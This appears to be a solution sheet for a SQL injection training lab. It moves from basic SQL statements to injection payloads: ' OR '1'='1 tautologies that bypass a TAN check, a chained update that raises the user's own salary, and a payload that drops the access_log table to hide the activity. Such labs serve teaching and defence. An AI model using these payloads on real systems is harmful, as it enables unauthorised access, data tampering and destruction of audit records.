# SQL Injection (intro)

## 2 - What is SQL?
Look at the example table. Try to retrieve the department of the employee Bob Franco. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.

Answer:
SQL Query = 
`select department from employees where first_name = 'Bob' and last_name = 'Franco'`

## 3 - Data Manipulation Langauge
Try to change the department of Tobi Barnett to 'Sales'. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.

Answer:
SQL Query = 
`update employees set department = 'Sales' where first_name = 'Tobi' and last_name = 'Barnett'`

## 4 - Data Definition Language (DDL)
Now try to modify the scheme by adding the column "phone" (varchar(20)) to the table "employees". :

Answer:
SQL Query =
`alter table employees add column phone varchar(20)`

## 5 - Data Control Language (DCL)
Try to grant the usergroup "UnauthorizedUser" the right to alter tables:

Answer:
SQL Query =
`grant ALTER table to 'UnauthorizedUser'`

## 9 - Try It! String SQL Injection

SQL Query in code
```"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";```

Answer:
```' OR '1'='1```

## 10 - Try It! Numeric SQL Injection

SQL Query in code
```"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;```

Answer:
Login_Count = `1` 
User_Id = `1 OR 1=1`

Final Query = ```SELECT * From user_data WHERE Login_Count = 1 and userid= 1 OR 1=1```

## 11 - Compromising confidentially with String SQL injection

SQL Query in code
```
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
```

Answer:
Employee Name: `name`
Authentication TAN: `' OR '1'='1`

## 12 - Compromising Integrity with Query chaining
You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.
Better go and change your own salary so you are earning the most!

Remember: Your name is John Smith and your current TAN is 3SL99A.

Answer:
Employee Name: `name`
Authentication TAN: `'; update employees set salary = 100000 where auth_tan = '3SL99A`

## 13 - Compromising Availability
Now you are the top earner in your company. But do you see that? There seems to be a access_log table, where all your actions have been logged to!
Better go and delete it completely before anyone notices

Answer:
Action contains: `a'; drop table access_log; --`

 




